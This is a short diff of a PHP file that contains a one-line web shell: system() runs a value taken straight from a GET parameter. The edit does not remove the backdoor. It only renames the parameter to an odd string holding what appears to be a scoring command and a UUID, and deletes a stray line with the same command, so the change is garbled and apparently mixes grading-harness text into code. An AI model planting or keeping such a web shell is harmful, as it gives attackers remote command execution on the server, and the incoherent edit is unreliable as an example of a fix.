@@ -1,4 +1,4 @@
 <?php 
-  system($_GET['c']);
+  system($_GET['/usr/local/bin/score 605b4613-7392-4734-bfac-17236f08f1dd']);
 ?>
-/usr/local/bin/score 605b4613-7392-4734-bfac-17236f08f1dd
+
